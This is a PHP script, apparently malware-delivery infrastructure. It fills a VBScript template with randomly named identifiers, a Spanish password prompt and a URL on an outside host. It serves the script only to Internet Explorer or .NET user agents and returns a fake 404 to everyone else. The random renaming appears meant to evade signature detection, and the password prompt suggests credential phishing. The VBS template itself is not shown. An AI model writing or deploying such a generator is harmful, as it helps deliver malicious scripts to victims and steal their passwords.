<?php


$user_agent = strtolower($_SERVER['HTTP_USER_AGENT']);

$user_agent = " .net ";


if (strpos($user_agent, ".net") > 0 || strpos($user_agent, "msie") > 0) {
function randName($len = 6) {
    return substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, $len);
}

// gerar dados dinâmicos
$data = [
    "{{VAR1}}" => randName(),
    "{{VAR2}}" => randName(),
    "{{VAR3}}" => randName(),
    "{{VAR4}}" => randName(),
    "{{FUNC_NAME}}" => randName(),
    "{{CONST8}}" => "Introduce la contrasena",
    "{{CONST9}}" => "Contrasena",
    "{{VBS_NAME}}" => randName(8) . ".vbs",
    "{{URL}}" => "80.32.109.208.host.secureserver.net/vb/"
];


// ler template
$template = file_get_contents("templateVbs.txt");

if ($template === false) {
    die("Erro ao ler template");
}

// substituir placeholders
$result = str_replace(array_keys($data), array_values($data), $template);

// salvar resultado final
//file_put_contents("output.vbs", $result);

// saída
//echo "Arquivo gerado com sucesso!\n\n";
    header('Content-Type: text/plain;');
echo $result;
} else {
    header('Content-Type: text/plain;');
    header("HTTP/1.0 404 Not Found");
}